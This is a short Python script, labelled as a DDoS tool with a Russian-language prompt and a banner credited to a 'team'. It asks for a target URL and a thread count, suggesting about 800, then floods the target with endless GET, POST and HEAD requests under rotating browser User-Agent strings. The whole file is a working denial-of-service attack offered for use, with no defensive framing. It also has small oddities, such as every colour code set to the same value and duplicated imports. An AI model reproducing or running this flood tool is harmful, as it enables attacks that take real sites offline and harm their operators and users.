# DDoS
import colorama
import threading
import requests
import random
import os
import sys
import time
import undetected_chromedriver
# Colors
yellow='\033[92m'
cyan='\033[92m'
pink='\033[92m'
green = '\033[92m'
red ='\033[92m'
white ='\033[92m'
black ='\033[92m'
# Requests

os.system("clear")
print(green + f"З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")

import socket
import requests 
from threading import Thread
import random
from colorama import Fore, Style
import os

users = [
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv: 75.0) Gecko / 20100101 Firefox / 75.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
    "Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
    "Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2 (KHTML, like Gecko) Safari/531.2 Epiphany/2.30.0",
    "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
]
headers = {
    'User-Agent' : random.choice(users)
}
os.system("clear")
print(green + f"З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")

print('''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''')
print("DDos script")

url = input("Ссылка════> ")
threads = int(input("Потоки (~800 лучше)════> "))

payload = {
    'namest': 'username',
    'passwordst': 'password',
}
def send():
    while True:
        requests.get(url, headers=headers, data=payload)
        print("Get...")
        requests.post(url, headers=headers, data=payload)
        print("post...")
        requests.head(url, headers=headers, data=payload)
        print("head...")

	
if __name__ == '__main__':
    for i in range (threads):
        thr = Thread(target=send)
        thr.start()
